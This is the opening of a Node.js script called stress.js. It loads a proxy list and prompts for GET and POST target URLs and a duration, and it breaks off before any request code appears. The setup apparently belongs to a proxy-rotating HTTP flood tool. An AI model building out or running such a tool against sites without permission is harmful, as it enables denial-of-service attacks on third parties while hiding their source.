// stress.js
const axios = require('axios');
const readline = require('readline');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const proxies = fs.readFileSync('proxy.txt', 'utf8').split('\n').filter(Boolean);

rl.question('Enter GET URL: ', (urlGet) => {
  rl.question('Enter POST URL: ', (urlPost) => {
    rl.question('Duration (seconds): ', (durasi) => {
      
